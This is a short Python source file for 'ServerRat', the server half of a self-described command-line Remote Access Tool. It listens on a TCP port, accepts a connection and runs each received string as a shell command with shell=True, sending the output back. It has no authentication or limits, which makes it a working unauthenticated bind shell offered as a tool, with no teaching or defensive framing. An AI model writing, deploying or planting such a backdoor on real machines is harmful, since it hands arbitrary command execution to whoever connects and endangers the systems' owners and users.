import socket
import argparse
import subprocess


class ServerRat:

    def __init__(self, listen_host, listen_port):
        self.listen_host = listen_host
        self.listen_port = int(listen_port)

    def create_server_socket(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.listen_host, self.listen_port))
            server_socket.listen(1)
            print("Waiting for a connection...")
            connection, address = server_socket.accept()
            print("Connection established!")
            with connection:
                print("Connection received from: ", address)
                while True:
                    data = self.recv_command(connection)

                    if data.decode() == "quit":
                        print("Client has ended the session.")
                        break

                    command_output = self.execute_command(data)
                    self.send_command_output(connection, command_output)

    def recv_command(self, connection):
        return connection.recv(1024)

    def execute_command(self,data):
        command = data.decode()
        return subprocess.run(command, shell=True, capture_output=True)

    def send_command_output(self, connection, command_output):
        connection.send(command_output.stdout)


def main(args):
    server_rat = ServerRat(args.listen_address, args.listen_port)
    server_rat.create_server_socket()


def _arg_parse():
    parser = argparse.ArgumentParser(description="ServerRat is the server side of the command-line based Python "
                                                 "Remote Access Tool")
    parser.add_argument("-l", "--listen-address", help="The listening address")
    parser.add_argument("-p", "--listen-port", help="The listening port")
    return parser.parse_args()


if __name__ == "__main__":
    args = _arg_parse()
    main(args)
